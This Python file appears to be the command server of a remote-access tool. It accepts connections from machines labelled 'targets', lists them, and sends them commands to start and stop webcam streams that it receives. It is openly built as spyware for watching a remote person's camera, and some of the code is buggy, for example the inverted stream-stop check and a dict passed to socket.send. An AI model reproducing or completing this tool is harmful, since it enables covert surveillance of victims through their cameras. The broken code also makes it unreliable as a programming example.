from ast import While
from lib2to3.pgen2.token import COMMA
import colorama
import socket
from vidstream import StreamingServer
import threading
import pandas
from prettytable import PrettyTable
import time
#from assets.colors import colors
#from assets.symbols import *

TARGETS = {}
HOST = socket.gethostbyname(socket.gethostname())
PORT = 1827
CAMERA_STREAMING_PORT = 8989
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST , PORT))
server.listen(3)
class colors (object):
    def red():
        return colorama.Fore.RED
    def green():
        return colorama.Fore.GREEN
    def blue():
        return colorama.Fore.BLUE
    def white():
        return colorama.Fore.WHITE
    def yellow():
        return colorama.Fore.YELLOW
    def black():
        return colorama.Fore.BLACK

CR = colors
Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
Ssowrd = f"{CR.red()} ==> {CR.white()}"

def StartCameraStreamingServer(host, port):
    global CAMERA_STREAMING    
    CAMERA_STREAMING = StreamingServer(host, port)
    CAMERA_STREAMING_THREAD = threading.Thread(
                    target=CAMERA_STREAMING.start_stream()
            )
    CAMERA_STREAMING_THREAD.start()
def StopCameraStreamingServer() :
    CAMERA_STREAMING.stop_stream()

def TARGETS_SHOWER():
    TARGET_TABLE = PrettyTable([f"{CR.red()}ip{CR.white()}", f"{CR.red()}port{CR.white()}"])
    for x in TARGETS:
        TARGET_TABLE.add_row([f"{CR.green()}{TARGETS[x][0]}{CR.white()}", f"{CR.green()}{TARGETS[x][1]}{CR.white()}"])
    print(TARGET_TABLE)

def connect_with_host(target_add):
    SESSION_START_STR = "session start"
    while True:
        SERVER_UP = False
        print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
        COMMAND_FOR_TARGET_SESSION = input(f"\r   {CR.red()} <|{CR.green()}SESSION{CR.yellow()}target={TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
        if COMMAND_FOR_TARGET_SESSION == "start stream":
            JSON_MSG = {
                b"command" : b"start stream"
            }
            target_add.send(JSON_MSG)
            time.sleep(0.4)
            StartCameraStreamingServer(
                host=HOST,
                port=CAMERA_STREAMING_PORT
            )
            SERVER_UP = True
        elif COMMAND_FOR_TARGET_SESSION == "stop stream":
            if SERVER_UP:
                print(f"{Sminess} {CR.red()}Stream isn't up to stop it {CR.white()}")
            else:
                JSON_MSG_TO_STOP_STREAM = {
                    b"command" : b"stop stream"
                }
                target_add.send(JSON_MSG_TO_STOP_STREAM)
                time.sleep(0.1)
                StopCameraStreamingServer()
                print(f"{Splus} {CR.green()}Stream stoped{CR.white()}")
        elif COMMAND_FOR_TARGET_SESSION == "back to server":
            break
        
def run():
    print(f"{Ssowrd} {CR.green()}Waiting for any upcoming connecting...")
    add, ip = server.accept()
    print(f"{Splus} {CR.green()}Target connected {CR.yellow()} |{CR.red()} Host> {CR.blue()}{ip[0]} {CR.red()}Port> {CR.blue()}{ip[1]}")
    if add in TARGETS:
        pass
    else:
        TARGETS[add] = ip    
    print(f" {Splus} {CR.green()}Target added to list{CR.white()}")
    while True:   
        COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}SERVER{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
        if COMMAND_INPUT == "show target":
            TARGETS_SHOWER()
        elif COMMAND_INPUT.startswith("connect"):
            THE_ADDR = COMMAND_INPUT.replace("connect ", "")
            if THE_ADDR:
                for x in TARGETS:
                    if x.getsockname()[0] == THE_ADDR:
                        connect_with_host(target_add=x)
            else:
                print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")

run()